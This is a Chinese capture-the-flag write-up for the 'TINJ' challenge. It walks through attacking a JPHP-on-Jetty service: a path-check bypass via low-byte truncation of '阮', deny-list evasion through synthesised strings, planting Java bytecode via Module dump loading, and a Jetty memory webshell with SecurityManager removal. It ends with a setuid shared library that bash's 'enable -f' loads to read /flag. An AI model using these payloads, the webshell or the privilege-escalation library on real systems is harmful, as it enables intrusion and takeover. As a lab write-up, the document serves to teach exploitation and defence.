# TINJ

## 题目简述

题目是运行在 Jetty/JPHP 上的 Web 服务，表面是 PHP 应用，实际由 Java 实现的 PHP 解释器执行。核心链路为：利用 JPHP 字符到字节转换差异绕过路由访问控制，到达 `/calc` 的 eval sink；绕过 PHP 黑名单后下载运行时 JAR；再利用 `php\lang\Module` 的 compiled dump 加载流程把自定义 Java 字节码植入共享 class loader，注册 Jetty 内存马，最后绕过 SecurityManager 并借带 `cap_setuid` 的 bash 读取 `/flag`。

## 解题过程

服务有几个关键识别信号：404 页面来自 Jetty，源码中出现 `php\http\HttpServer`、`php\lang\Environment` 等类，说明它不是普通 PHP-FPM，而是 JPHP 运行时。应用注册了 `/hello/**`、`/calc/**` 等路由，`/calc` 最终会把 `hello_world` 参数拼入一段 sandbox PHP 后执行：

```php
$sandbox = 'ob_start(); ';
$sandbox .= 'EnterSandbox(); try { $ret = (string)(function () { return ' . $c->expr . '; })(); ';
$sandbox .= 'gc_collect_cycles(); ';
$sandbox .= '$buf = (string) ob_get_clean(); ';
$sandbox .= '} catch (\Throwable $e) { throw new RuntimeException((string) $e->getMessage(), (int) $e->getCode(), null); } ';
$sandbox .= 'return $buf!==""?$buf:$ret;';

$isolated = new Environment(null, 3);
$ret = $isolated->execute(function () use ($sandbox) {
    return eval($sandbox);
});
```

直接访问 `/calc` 会先过 `CalcAccessInterceptor`，要求 `X-Language: Java` 且来源为本地地址：

```php
if (self::startsWith($req->path, HttpConsts::ROUTE_CALC)) {
    $lang = (string)$req->header(HttpConsts::HDR_LANGUAGE, '');
    if ($lang !== HttpConsts::LANGUAGE_JAVA) return new ResponseDTO("Forbidden", ...);
    if (!$this->localhostPolicy->isLocalhost((string)$req->remoteAddr)) {
        return new ResponseDTO("Forbidden", ...);
    }
}
```

但拦截器顺序中 `CalcAccessInterceptor` 在 `TransportSurfaceProjectionInterceptor` 前面，前者看的是归一化前路径，后者随后才做路径投影：

```php
new CalcAccessInterceptor(...),
...
new TransportSurfaceProjectionInterceptor(...),
```

投影阶段先检查原始路径是否包含 `..`、`;`、`\`、`%`、`#`、`@`、`flag`，随后再调用：

```php
public static function filterInvalidPath($path) {
    $p = (string)$path;
    return rawurldecode(rawurlencode(urldecode(urlencode(hex2bin(bin2hex(str_rot13(str_rot13(base64_decode(base64_encode($p))))))))));
}
```

JPHP 的 `bin2hex()` 对 Java `char` 只取低字节，高位会被丢弃。字符 `阮` 的低字节为 `0x2e`，两个 `阮` 在这条链中会变成 `..`。因此用：

```text
/hello/阮阮/calc?hello_world=2*2
```

访问时，访问控制看到的是 `/hello/...`，不会进入 `/calc` 分支；投影后路径变成 `/calc`，从而到达 eval sink。

接下来需要绕过输入黑名单。配置里限制 payload 长度为 `500`，并禁用了大量 token：

```php
'denyTokens' => ['java', '.', 'lang', 'Runtime', 'Process', 'System',
                 'ClassLoader', 'Module', 'Environment', 'Reflect',
                 'eval', 'assert', 'include', 'require', '_', ':',
                 'load', 'invoke', 'call', 'user', 'func', 'array',
                 'read', 'write', 'get', 'set', 'class', 'new', ...],
'maxLength' => 1000/2,
```

JPHP 保留了一些老特性：未定义标识符会被当成字符串常量，且支持动态函数调用。可以用 `implode(null,[he,x2bin])` 构造出 `hex2bin`，再由 `ff20`、`ff5f`、`ff2e` 等值取出空格、下划线、点号等被禁字符：

```python
H2B = 'implode(null,[he,x2bin])'
SP = f'{H2B}(ff20)[1]'
US = f'{H2B}(ff5f)[1]'
DT = f'{H2B}(ff2e)[1]'
AR = f'{H2B}(ff2a)[1]'

CUFA = f'implode(null,[ca,ll,{US},us,er,{US},fu,nc,{US},ar,ray])'
GDF  = f'implode(null,[ge,t,{US},de,fined,{US},fu,nctions])'
GB   = f'implode(null,[gl,ob])'
FGC  = f'implode(null,[fi,le,{US},ge,t,{US},co,ntents])'
```

有些函数直接调用会触发 JPHP 传参相关的 `NullPointerException`，包一层 `call_user_func_array()` 即可。用 `glob(*)` 找到 JAR 文件名，再用 `file_get_contents()` 分块读取并 base64 输出：

```python
ext(f'implode({SP},{CUFA}({GDF},[])[implode(null,[in,ternal])])')
ext(f'implode({SP},{GB}({AR}))')
ext(f'{B64E}({FGC}({GB}({AR})[0],false,null,0,10000000))', False)
```

拿到 JAR 后分析 sandbox。`DenyAllSecurityManager` 默认禁止命令执行、任意文件读写、反射、ClassLoader、线程、出站网络等：

```java
public void checkExec(String cmd) {
    throw new SecurityException("Denied by disable_functions (php sandbox): " + cmd);
}

public void checkWrite(String file) {
    throw new SecurityException("Denied by open_basedir (php sandbox): " + file);
}

if ("accessDeclaredMembers".equals(name) && isInSandbox()) {
    throw new SecurityException("Denied RuntimePermission in sandbox: " + perm);
}
```

`SandboxFunctions` 中的 `EnterSandbox()` 会增加全局 `inSandbox`，`Acquire()` 用一个 `Semaphore(1)` 串行化请求，因此不能靠竞争窗口退出 sandbox：

```java
private static volatile int inSandbox = 0;
private static Semaphore acquireSemaphore = new Semaphore(1);
```

真正可用的路径是 JPHP 的 compiled `Module` 加载。`php\lang\Module` 在 `compiled=true` 时会先由 `ModuleDumper.load()` 解析 PHB dump，再进入 `RuntimeClassLoader.loadModule()` 执行 `defineClass()`，之后才在 `module.setNativeMethod()` 等步骤触发 SecurityManager 异常。也就是说，请求最终可以失败，但自定义 class 已经被 define 到共享的 `RuntimeClassLoader` 中。

利用还依赖几个实现细节：

- 多个 `Environment` 共用同一个 `RuntimeClassLoader`，已 define 的 class 不会随请求结束消失。
- `php\lib\reflect::newInstance('php\lang\Module', [], false)` 可以创建不运行构造函数的空 Module。
- `getClasses()[$name]->newInstanceWithoutConstructor()` 可以实例化 dump 中的类。
- `php\util\Shared::value()` 在多请求之间保存引用，可作为分块传输和跨请求状态。

长度限制可以用 `SharedQueue` 绕过。每个请求只追加一个短 hex chunk，之后在服务端把所有 chunk 拼回完整 PHB dump：

```php
php\util\Shared::value('q')->set(
    php\lib\reflect::newInstance('php\util\SharedQueue')
);
php\util\Shared::value('q')->get()->add($hex_chunk);

php\util\Shared::value('h')->set(
    php\lib\Str::join(php\util\Shared::value('q')->get(), null)
);
php\util\Shared::value('b')->set(
    php\lib\Str::encode(hex2bin(php\util\Shared::value('h')->get()), 'latin1')
);
php\util\Shared::value('s')->set(php\lib\reflect::newInstance('php\io\MemoryStream'));
php\util\Shared::value('s')->get()->write(php\util\Shared::value('b')->get());
php\util\Shared::value('s')->get()->seek(0);
```

先上传 `JettyMemoryShellHandler` 的 dump，创建空 Module 并调用构造函数。该请求会在后续步骤报错，但 helper class 已被加载：

```php
php\util\Shared::value('m')->set(
    php\lib\reflect::newInstance('php\lang\Module', [], false)
);
php\util\Shared::value('m')->get()->__construct(
    php\util\Shared::value('s')->get(),
    true,
    true
);
```

第二次上传 hybrid stage dump。为了避免类名冲突，可把 `HybridJettyShellStageFresh` 替换成同长度随机类名。加载后从 Module 的 class 表中取出该类并实例化：

```php
php\util\Shared::value('m')->get()
    ->getClasses()[$fresh_name]
    ->newInstanceWithoutConstructor();
```

该类构造函数运行在 Jetty 请求上下文中，直接修改 Jetty handler 树，把内存马插到最前面：

```java
HttpConnection conn = HttpConnection.getCurrentConnection();
Server server = conn.getHttpChannel().getServer();
Handler root = server.getHandler();

HandlerCollection hc = (HandlerCollection) root;
hc.prependHandler(new JettyMemoryShellHandler());
```

内存马路径为 `/mshell`。处理请求时先尝试清掉 `System.security`：

```java
Constructor<MethodHandles.Lookup> c =
    MethodHandles.Lookup.class.getDeclaredConstructor(Class.class, int.class);
c.setAccessible(true);
MethodHandles.Lookup lookup = c.newInstance(System.class, -1);
MethodHandle mh = lookup.findStaticSetter(System.class, "security", SecurityManager.class);
mh.invokeExact((SecurityManager) null);
```

随后即可通过 `ProcessBuilder("/bin/sh", "-c", cmd)` 执行命令。访问：

```text
/mshell?cmd=id
```

若返回 `exit=0;out=...`，说明内存马已经安装。

容器启动脚本中 `/flag` 为 `0400`，但给 bash 加了 `cap_setuid`：

```sh
echo "ACTF{tHer3_is_n0_f1ag_gRDnaX0mdyyAbFchjpaV}" > /flag
chmod 400 /flag
setcap cap_setuid+ep `which bash`
```

因此最后通过 `/mshell` 分块写入一个共享库，并让 bash 通过 loadable builtin 路径 `dlopen` 它。共享库 `_init()` 中提权并执行环境变量里的命令：

```c
// gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc
#include <stdlib.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system(getenv("CMD") ? getenv("CMD") : "id");
}
```

触发命令形如：

```bash
CMD='cat /flag' /bin/bash -c 'enable -f /tmp/preload.so a' 2>/dev/null
```

读取到真实 flag：

```text
ACTF{tHer3_is_n0_f1ag_gRDnaX0mdyyAbFchjpaV}
```

需要注意，`launcher.conf` 中的 `flag{leaked_flag_for_ctf_challenge...}` 只是注释里的误导内容，不是最终结果。

## 方法总结

- 核心技巧：利用 JPHP 字符/字节语义差异绕过路径检查，再用 `php\lang\Module` 的 compiled dump 加载顺序把自定义 Java class 植入共享 class loader。
- 识别信号：PHP 服务由 Jetty/JPHP 承载、路由检查和路径归一化分离、JPHP 老式字符串常量行为、SecurityManager 与动态字节码加载同时出现时，应检查跨语言边界和 class loader 生命周期。
- 复用要点：严格黑名单和短 payload 可用运行时合成字符串与跨请求 Shared 队列处理；SecurityManager 内直接 RCE 不一定可行，但注册请求生命周期之外执行的内存马可以改变执行时序。
